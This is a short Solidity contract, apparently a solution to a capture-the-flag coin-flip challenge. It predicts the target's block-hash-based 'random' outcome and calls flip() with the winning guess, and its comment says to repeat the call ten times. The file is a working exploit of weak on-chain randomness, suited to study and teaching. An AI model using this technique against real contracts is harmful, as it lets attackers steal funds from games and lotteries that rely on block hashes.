// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IConFlip {
    function flip(bool _guess) external returns (bool);
}

contract Solution {
    // Call this 10 times with your instance address and you'll win
    function guess(address coinFlipInstance) external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue /
            57896044618658097711785492504343953926634992332820282019728792003956564819968;
        bool side = coinFlip == 1 ? true : false;

        IConFlip(coinFlipInstance).flip(side);
    }
}
